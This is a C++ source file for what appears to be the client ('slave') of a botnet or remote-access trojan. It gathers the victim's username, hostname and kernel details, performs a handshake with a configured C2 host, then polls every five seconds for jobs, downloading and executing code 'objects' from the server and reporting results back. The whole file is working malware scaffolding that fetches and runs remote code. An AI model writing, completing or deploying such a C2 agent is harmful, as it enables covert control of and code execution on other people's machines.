

#include "stdafx.h"
#include "ConnectionController.h"
#include "ObjectLoader.h"

void prepareConnection(ConnectionController* cc) {

    // Get username.
    char* username = getlogin();
    
    // Get computer information.
    struct utsname buffer;
    if (uname(&buffer) < 0) {
        cc->prepareConnection("UnknownName", username, "Linux ?");
        return;
    }

    // Put all together.
    int infoSize = strlen(buffer.release) + strlen(buffer.machine) + strlen(buffer.version);
    char info[infoSize];
    snprintf(info, infoSize, "%s %s %s", buffer.release, buffer.machine, buffer.version);

    cc->prepareConnection(buffer.nodename, username, info);
}

int newObject(ConnectionController* cc) {

    ObjectLoader* loader = new ObjectLoader();
    
    if (!cc->getObject(loader)) {
        printf("Failed to retrieve object!\n");
        return RESPONSE_ERROR;
    }

    int retVal = 0;

    // Cleanup object loader.
    loader->~ObjectLoader();
    return retVal;
}



void loop(ConnectionController* cc) {

    for (;;) {
        sleep(5);

        int responseCode = cc->checkNewJob();
        switch (responseCode) {
            case RESPONSE_NEW_OBJECT: {
                
                int code = newObject(cc); // Load and execute new object.

                // Send return value to server.
                if (cc->finishJob(code) != RESPONSE_LOITER) {
                    printf("Failed to finish the job!\n");
                }

                break;
            }

            case RESPONSE_NOT_INIT: {
                printf("Server didn't get our credentials!\n");
                
                int code = cc->handShake();
                if (code != RESPONSE_LOITER && code != RESPONSE_NEW_OBJECT) {
                    printf("Server gave invalid response! Exiting...\n");
                    return;
                }

                break;
            }

            case RESPONSE_PONG: {
                printf("PONG!\n");
                break;
            }

            default: {
                printf("Error occured! Invalid response from server: %d!\n", responseCode);
                return;
            }
        }
    }

}

int main(int argc, char* argv[]) 
{
    const char* slaveId =  SLAVE_ID;

    // Check if slaveId contains Id string.
    if (strlen(SLAVE_ID) == 0) {
        slaveId = "FAKE_SLAVE_ID";
    }

    printf("Target C2 server: %s\n", C2HOST);
    printf("Slave ID: %s\n", slaveId);
    ConnectionController *cc = new ConnectionController(slaveId);
    prepareConnection(cc);

    int handshakeCode = 0;
    if ((handshakeCode = cc->handShake()) == RESPONSE_ERROR) {
        printf("Failed to perform handshake for initial connection!\n");
        return false;
    }
    else if (handshakeCode == RESPONSE_NEW_OBJECT) {
        printf("Getting init object.\n");

        if (!newObject(cc)) {
            printf("Failed to retrieve init object!\n");
            return false;
        } 
    }
    else {
        loop(cc);
    }

    return 0;
}